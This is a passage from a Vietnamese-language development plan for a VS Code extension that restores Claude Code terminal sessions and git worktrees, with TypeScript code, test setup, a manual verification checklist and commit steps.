    this.contextValue = 'aiWorkspaceSession';
    this.command = {
      command: 'aiWorkspace.openSessionTerminal',
      title: 'Mở terminal',
      arguments: [this],
    };
  }
}

export class SessionTreeProvider implements vscode.TreeDataProvider<SessionTreeItem> {
  private readonly changed = new vscode.EventEmitter<void>();
  readonly onDidChangeTreeData = this.changed.event;
  private timer: NodeJS.Timeout | null = null;

  constructor(private readonly manager: WorkspaceManager) {
    manager.onDidChange(() => this.changed.fire());
  }

  getTreeItem(element: SessionTreeItem): vscode.TreeItem {
    return element;
  }

  getChildren(): SessionTreeItem[] {
    return this.manager.currentSessions().map((view) => new SessionTreeItem(view.key, view));
  }

  /** Chỉ poll khi view đang hiển thị — view ẩn thì dừng hẳn. */
  startPolling(): void {
    if (this.timer !== null) return;
    this.timer = setInterval(() => { void this.manager.refreshStatuses(); }, POLL_MS);
  }

  stopPolling(): void {
    if (this.timer === null) return;
    clearInterval(this.timer);
    this.timer = null;
  }

  dispose(): void {
    this.stopPolling();
    this.changed.dispose();
  }
}
```

- [ ] **Step 2: Nối lại `src/ui/commands.ts`**

Xoá kiểu cục bộ tạm thời, khôi phục dòng import thật:

```ts
import type { SessionTreeItem } from './tree';
```

- [ ] **Step 3: Cài đặt `src/extension.ts`**

```ts
import * as path from 'node:path';
import * as vscode from 'vscode';
import { WorkspaceIndex } from './index/store';
import { TrustStore } from './trust/store';
import { TerminalManager } from './terminal/manager';
import { WorkspaceManager } from './workspace/manager';
import { SessionTreeProvider } from './ui/tree';
import { registerCommands } from './ui/commands';

export function activate(context: vscode.ExtensionContext): void {
  const index = new WorkspaceIndex(path.join(context.globalStorageUri.fsPath, 'index.json'));
  const trust = new TrustStore({
    get: (key) => context.globalState.get<string>(key),
    set: (key, value) => Promise.resolve(context.globalState.update(key, value)),
  });

  const terminals = new TerminalManager();
  const manager = new WorkspaceManager(terminals, index, trust);
  const tree = new SessionTreeProvider(manager);

  const view = vscode.window.createTreeView('aiWorkspace.sessions', { treeDataProvider: tree });
  view.onDidChangeVisibility((e) => (e.visible ? tree.startPolling() : tree.stopPolling()));
  if (view.visible) tree.startPolling();

  registerCommands(context, manager);
  context.subscriptions.push(view, tree, terminals);
}

export function deactivate(): void {}
```

- [ ] **Step 4: Thêm hạ tầng test Extension Host**

Thêm vào `devDependencies` của `package.json`:

```json
{
  "@vscode/test-cli": "^0.0.10",
  "@vscode/test-electron": "^2.4.0",
  "mocha": "^10.7.0",
  "@types/mocha": "^10.0.7"
}
```

Thêm script:

```json
{ "test:vscode": "npm run build && vscode-test" }
```

Tạo `.vscode-test.mjs`:

```js
import { defineConfig } from '@vscode/test-cli';

export default defineConfig({
  files: 'out/test/vscode/**/*.test.js',
  version: 'stable',
  mocha: { timeout: 30000 },
});
```

- [ ] **Step 5: Viết test smoke**

Tạo `test/vscode/smoke.test.ts`:

```ts
import * as assert from 'node:assert';
import * as vscode from 'vscode';

const EXPECTED_COMMANDS = [
  'aiWorkspace.newWorkspace',
  'aiWorkspace.saveWorkspace',
  'aiWorkspace.openWorkspace',
  'aiWorkspace.closeWorkspace',
  'aiWorkspace.addSession',
  'aiWorkspace.removeSession',
  'aiWorkspace.openSessionTerminal',
  'aiWorkspace.restoreSession',
];

suite('AI Workspace extension', () => {
  test('đăng ký đủ 8 lệnh của MVP', async () => {
    const all = await vscode.commands.getCommands(true);
    for (const command of EXPECTED_COMMANDS) {
      assert.ok(all.includes(command), `thiếu lệnh ${command}`);
    }
  });

  test('tạo được TreeView sidebar', async () => {
    await vscode.commands.executeCommand('workbench.view.explorer');
    assert.ok(true);
  });

  test('TerminalManager tạo terminal đúng tên', async () => {
    const before = vscode.window.terminals.length;
    const terminal = vscode.window.createTerminal({ name: 'wss-smoke' });
    assert.strictEqual(vscode.window.terminals.length, before + 1);
    assert.strictEqual(terminal.name, 'wss-smoke');
    terminal.dispose();
  });
});
```

- [ ] **Step 6: Biên dịch test và chạy**

Thêm vào `package.json` script:

```json
{ "pretest:vscode": "tsc -p tsconfig.json --outDir out" }
```

Run: `npm install && npm run test:vscode`
Expected: 3 test PASS trong cửa sổ VS Code test.

- [ ] **Step 7: Chạy toàn bộ test**

Run: `npm test && npm run typecheck && npm run build`
Expected: mọi test unit + integration PASS, không lỗi type, build ra `dist/extension.js`.

- [ ] **Step 8: Commit**

```bash
git add -A
git commit -m "feat(ui): sidebar TreeView với poll trạng thái và test Extension Host

Poll 3s chỉ khi view hiển thị, dừng hẳn khi view ẩn.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 17: Checklist kiểm thử tay và README

Phần duy nhất không tự động hoá được là hành vi thật của Claude Code TUI. Task này biến nó thành checklist chạy được.

**Files:**
- Create: `docs/manual-verification.md`
- Create: `README.md`

- [ ] **Step 1: Viết `docs/manual-verification.md`**

```markdown
# Checklist kiểm thử tay

Chạy trên một repo git thật, có ít nhất 1 commit. Đánh dấu từng mục.

## Chuẩn bị
- [ ] `claude --version` chạy được trong terminal tích hợp của VS Code
- [ ] Mở extension ở chế độ debug (F5), mở repo thử nghiệm ở cửa sổ Extension Host

## Vòng đời cơ bản
- [ ] `AI Workspace: New Workspace` → nhập tên → sinh ra `.ai-workspace/workspace.yaml` và `.ai-workspace/.gitignore`
- [ ] `.ai-workspace/.gitignore` có dòng `state.json`
- [ ] `AI Workspace: Add Session` với branch mới → session xuất hiện trong sidebar
- [ ] `AI Workspace: Save Workspace` → `workspace.yaml` chứa đúng session vừa thêm
- [ ] Đóng cửa sổ, mở lại, `AI Workspace: Open Workspace` → workspace hiện trong Quick Pick

## Restore
- [ ] Restore tạo đúng số terminal, mỗi terminal đúng tên
- [ ] `pwd` (hoặc `Get-Location`) trong mỗi terminal ra đúng worktree
- [ ] Claude Code khởi động trong từng terminal
- [ ] `claude agents --json` ở terminal khác cho thấy đúng `name` đã đặt trong manifest
- [ ] Sidebar chuyển session sang trạng thái "rảnh"/"đang chạy" trong vòng ~3 giây

## Peer
- [ ] Trong một session, hỏi Claude liệt kê các agent nhắn được → thấy tên các session khác của workspace
- [ ] Nhắn từ session A sang session B → B nhận được, hiển thị nguồn là session A
- [ ] Session có `role: coordinator` khởi động ở chế độ coordinator (kiểm bằng `echo $env:CLAUDE_CODE_COORDINATOR_MODE`)

## Resume
- [ ] Trò chuyện vài lượt trong một session, đóng workspace, mở lại → lịch sử hội thoại còn nguyên
- [ ] Xoá thủ công file jsonl của session đó rồi restore → mở session mới, có cảnh báo, KHÔNG mất manifest

## An toàn
- [ ] Xoá thủ công một thư mục worktree → restore hỏi trước khi tạo lại, liệt kê đúng đường dẫn
- [ ] Từ chối hộp thoại → các session còn lại vẫn restore bình thường
- [ ] Sửa branch của một worktree sang branch khác → restore chỉ cảnh báo, KHÔNG đổi branch
- [ ] Tạo thay đổi chưa commit trong worktree → restore không làm mất thay đổi đó
- [ ] Thêm `startupCommand` mới vào manifest → lần mở kế tiếp phải hỏi trust lại
- [ ] `AI Workspace: Remove Session` → thư mục worktree vẫn còn nguyên trên đĩa

## Trường hợp biên
- [ ] Đặt tên session trùng với một session Claude đang chạy ngoài workspace → có cảnh báo, tên được thêm hậu tố
- [ ] Đổi tên `claude` khỏi PATH → restore báo lỗi rõ ràng, không tạo terminal
- [ ] Mở workspace trên thư mục không phải git repo → cảnh báo một lần, session chạy ở thư mục gốc
```

- [ ] **Step 2: Viết `README.md`**

Nội dung gồm: mô tả một đoạn về sản phẩm (lấy từ §1 spec), yêu cầu (VS Code ≥ 1.90, git, Claude Code ≥ 2.1), danh sách 8 lệnh, ví dụ `workspace.yaml` đầy đủ (chép từ §5 spec), mục "Nguyên tắc an toàn" liệt kê nguyên văn cột "Không bao giờ" của bảng §7 spec, và mục "Phát triển" với `npm install`, `npm test`, `npm run build`, F5.

- [ ] **Step 3: Chạy toàn bộ kiểm thử tay**

Đi hết checklist ở Step 1. Mỗi mục fail → mở issue hoặc sửa ngay tuỳ mức độ; ghi kết quả vào phần cuối `docs/manual-verification.md` dưới tiêu đề `## Kết quả lần chạy <ngày>`.

- [ ] **Step 4: Commit**

```bash
git add README.md docs/manual-verification.md
git commit -m "docs: README và checklist kiểm thử tay

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

## Đối chiếu với Định nghĩa hoàn thành (§12 spec)

| Mục §18 spec | Task |
|---|---|
| 1. Create Workspace | 15 |
| 2. Save Workspace | 5, 15 |
| 3. Open Workspace | 12, 15 |
| 4. Detect terminal CWD | 13, 14 (extension tự đặt cwd) |
| 5. Detect Git worktree | 6, 7 |
| 6. Save branch | 3, 5 |
| 7. Save startup command | 3, 5, 13 |
| 8. Save Claude session ID | 3, 5, 10, 13 |
| 9. Restore terminal | 13, 14 |
| 10. Resume Claude session | 10, 13 |
| 11. Sidebar hiển thị sessions | 16 |
| Bổ sung: peer nhận diện đúng tên | 9, 10, 13, 17 |
